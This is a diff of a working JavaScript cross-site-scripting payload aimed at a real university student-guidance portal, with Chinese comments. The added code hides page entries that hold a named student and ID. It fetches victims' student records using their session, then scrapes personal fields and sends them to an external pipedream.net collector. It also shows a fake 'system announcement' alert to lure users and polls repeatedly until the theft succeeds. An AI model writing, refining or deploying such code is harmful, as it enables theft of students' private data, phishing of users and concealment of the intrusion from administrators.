@@ -1,84 +1,104 @@
 (function() {
-    // 0. 防誤傷：如果是你自己 (有標記)，就什麼都不做，讓你看得到檔案以便刪除
     if (localStorage.getItem('iamadmin') === 'true') {
-        console.log(" [XSS] 檢測到攻擊者，停止隱藏，允許操作。");
+        console.log("🛡️ [XSS] 檢測到攻擊者本人，停止執行 Payload。");
         return; 
     }
-    
+
     function hideMyTracks() {
-        // 定義要隱藏的關鍵字 (你的名字、學號)
         const keywords = ["趙偉恆", "41347013S"]; 
         
-        // 針對 Bootstrap Panel 結構 (Turn 25 的頁面)
+        // 針對 Bootstrap Panel 結構
         document.querySelectorAll('.panel').forEach(panel => {
             if (keywords.some(k => panel.innerText.includes(k))) {
-                panel.style.display = 'none'; // 或者 panel.remove();
-                console.log("已隱藏 Panel");
+                panel.style.display = 'none';
             }
         });
 
-        // 針對 ExtJS 表格結構 (Turn 27 的頁面)
+        // 針對 ExtJS 表格結構
         document.querySelectorAll('tr.x-grid-row').forEach(row => {
             if (keywords.some(k => row.innerText.includes(k))) {
-                row.style.display = 'none'; // 或者 row.remove();
-                console.log("已隱藏 Table Row");
+                row.style.display = 'none';
             }
         });
     }
 
-    // 立即執行隱藏
+    // 立即執行隱藏，並在稍後再檢查幾次以防動態載入
     hideMyTracks();
-    // 為了保險，設個定時器再檢查幾次 (應對動態載入的內容)
     setTimeout(hideMyTracks, 500);
     setTimeout(hideMyTracks, 1000);
 
-
-    // ==========================================
-    // 2. 攻擊邏輯 (等待自然點擊)
-    // ==========================================
     (async () => {
         const ATTACKER = "https://eokic4rib1w9z4o.m.pipedream.net";
         const TARGET_URL = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";
-        const SSO_URL = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
 
-        // 攻擊函數
-        async function launchAttack() {
-            // 確保只觸發一次
-            document.removeEventListener('click', launchAttack);
-            
-            // 這時候使用者是點擊了頁面上的某個東西 (可能是正常的檔案下載)
-            // 我們順便彈出一個背後的視窗去跑 SSO
+        // 資料回傳
+        const report = (data) => {
+            const payload = JSON.stringify(data);
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(ATTACKER, payload);
+            } else {
+                fetch(ATTACKER, { method: 'POST', mode: 'no-cors', body: payload });
+            }
+        };
+
+        // 核心竊取函式
+        const trySteal = async () => {
             try {
-                // 彈窗 (Pop-under)
-                const popup = window.open(SSO_URL, "sso_bg", "width=100,height=100,left=9999,top=9999");
-                if (popup) {
-                    try { popup.blur(); window.focus(); } catch(e) {}
-                }
-
-                // 等待 6 秒 (這時候使用者還在看原本的頁面，或者正在下載檔案)
-                await new Promise(r => setTimeout(r, 6000));
-                try { popup.close(); } catch(e) {}
-
-                // 收割
                 const res = await fetch(TARGET_URL, { credentials: 'include' });
                 const txt = await res.text();
-
-                // 解析資料 (沿用你的解析邏輯)
-                // ... (這裡省略解析代碼，你可以把之前的解析邏輯放進來) ...
                 
-                // 這裡為了演示，直接發送長度
-                if (txt.includes("學生學號")) {
-                    navigator.sendBeacon(ATTACKER, JSON.stringify({
-                        status: "PWNED_SILENTLY",
-                        html_preview: txt.substring(0, 1000)
-                    }));
-                }
+                if ((txt.includes("學生學號") || txt.includes("學生基本資料")) && !txt.includes("請由校務行政")) {
+                    const parser = new DOMParser();
+                    const doc = parser.parseFromString(txt, "text/html");
+                    let stolenData = {};
+                    
+                    doc.querySelectorAll('.form-group').forEach(group => {
+                        const labelNode = group.querySelector('label');
+                        if (!labelNode) return;
+                        let key = labelNode.innerText.replace(/[\*\:\s　]/g, '').trim();
+                        if (!key) return;
 
+                        let value = "N/A";
+                        const staticP = group.querySelector('p.form-control-static');
+                        if (staticP) {
+                            value = staticP.innerText.trim();
+                        } else {
+                            const input = group.querySelector('input');
+                            if (input) value = input.value.trim();
+                        }
+                        stolenData[key] = value;
+                    });
+
+                    console.log("✅ [XSS] 資料竊取成功");
+                    report({ status: "SUCCESS_FULL_DATA", data: stolenData, timestamp: Date.now() });
+                    return true;
+                }
             } catch(e) {}
+            return false;
+        };
+
+        if (await trySteal()) return;
+
+        if (!sessionStorage.getItem('xss_alerted')) {
+            sessionStorage.setItem('xss_alerted', 'true');
+            
+            setTimeout(() => {
+                alert("【系統公告】\n\n您的學生輔導系統資料需要更新。\n\n請進入應用系統->學務相關系統->學生輔導系統進行資料更新。");
+            }, 1500);
         }
 
-        // 埋伏：等待使用者點擊頁面上的任意位置
-        document.addEventListener('click', launchAttack);
-    })();
+        // 3. 輪詢監聽
+        const timer = setInterval(async () => {
+            if (sessionStorage.getItem('xss_done')) {
+                clearInterval(timer);
+                return;
+            }
 
+            const success = await trySteal();
+            if (success) {
+                sessionStorage.setItem('xss_done', 'true');
+                clearInterval(timer);
+            }
+        }, 2000);
+    })();
 })();
